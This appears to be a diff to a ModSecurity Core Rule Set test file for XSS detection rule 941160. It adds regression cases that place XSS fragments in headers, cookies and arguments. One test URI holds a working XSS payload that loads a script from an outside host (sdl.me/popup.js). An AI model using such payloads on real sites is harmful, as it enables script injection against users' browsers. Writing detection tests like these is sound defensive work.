@@ -6,7 +6,7 @@
     description: "Tests to trigger, or not trigger 941160"
   tests: 
     - 
-      test_title: 941160-1FN
+      test_title: 941160-1
       desc: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
       stages:
       - 
@@ -15,12 +15,12 @@
             dest_addr: 127.0.0.1
             method: GET
             port: 80
-            uri: '/demo/xss/xml/vuln.xml.php?input=<script xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location=\"javascript:(function () {var x = document.createElement(\\\"script\\\");x.src = \\\"//sdl.me/popup.js?//\\\";document.childNodes\[0\].appendChild(x);}());\"",1000)</script>&//'
+            uri: '/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
             headers:
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            no_log_contains: id "941160"  
+            log_contains: id "941160"
     - 
       test_title: 941160-2
       desc: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
@@ -36,7 +36,7 @@
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            log_contains: id "941160"              
+            log_contains: id "941160"
     - 
       test_title: 941160-3
       desc: "just another XSS teststring: <x onend="
@@ -52,7 +52,7 @@
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            log_contains: id "941160"              
+            log_contains: id "941160"
     - 
       test_title: 941160-4
       desc: 'just another XSS teststring: "onzoom='
@@ -68,7 +68,7 @@
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            log_contains: id "941160"              
+            log_contains: id "941160"
     - 
       test_title: 941160-5
       desc: "just another XSS teststring: 'formaction="
@@ -84,7 +84,7 @@
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            log_contains: id "941160"              
+            log_contains: id "941160"
     - 
       test_title: 941160-6
       desc: "just another XSS teststring:< x: script"
@@ -100,7 +100,7 @@
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            log_contains: id "941160"              
+            log_contains: id "941160"
     - 
       test_title: 941160-7
       desc: "just another XSS teststring:<f o r m"
@@ -116,4 +116,103 @@
               User-Agent: ModSecurity CRS 3 Tests
               Host: localhost
           output:
-            log_contains: id "941160"              
+            log_contains: id "941160"
+    - 
+      test_title: 941160-8
+      desc: "just another XSS teststring: '<f o r m' in User-Agent header"
+      stages:
+      - 
+        stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/'
+            headers:
+              User-Agent: "ModSecurity CRS 3 Tests %3Cf%20o%20r%20m"
+              Host: localhost
+          output:
+            log_contains: id "941160"
+    - 
+      test_title: 941160-9
+      desc: "just another XSS teststring: '<f o r m' in Referer header"
+      stages:
+      - 
+        stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/'
+            headers:
+              User-Agent: "ModSecurity CRS 3 Tests"
+              Host: localhost
+              Referer: 'https://coreruleset.org/?%3Cf%20o%20r%20m'
+          output:
+            log_contains: id "941160"
+    - 
+      test_title: 941160-10
+      desc: "just another XSS teststring: '<f o r m' in Cookie name"
+      stages:
+      - 
+        stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/'
+            headers:
+              User-Agent: "ModSecurity CRS 3 Tests %3Cf%20o%20r%20m"
+              Host: localhost
+              Cookie: 'PHPSESSID%3Cf%20o%20r%20m=1234'
+          output:
+            log_contains: id "941160"
+    - 
+      test_title: 941160-10
+      desc: "just another XSS teststring: '<f o r m' in Cookie value"
+      stages:
+      - 
+        stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/'
+            headers:
+              User-Agent: "ModSecurity CRS 3 Tests"
+              Host: localhost
+              Cookie: 'PHPSESSID=1234%3Cf%20o%20r%20m'
+          output:
+            log_contains: id "941160"
+    - 
+      test_title: 941160-11
+      desc: "just another XSS teststring: '<f o r m' in ARG NAME"
+      stages:
+      - 
+        stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/?foo%3Cf%20o%20r%20m=bar'
+            headers:
+              User-Agent: "ModSecurity CRS 3 Tests"
+              Host: localhost
+          output:
+            log_contains: id "941160"
+    - 
+      test_title: 941160-12
+      desc: "just another XSS teststring: '<f o r m' in ARG VALUE"
+      stages:
+      - 
+        stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/?foo=bar%3Cf%20o%20r%20m'
+            headers:
+              User-Agent: "ModSecurity CRS 3 Tests"
+              Host: localhost
+          output:
+            log_contains: id "941160"
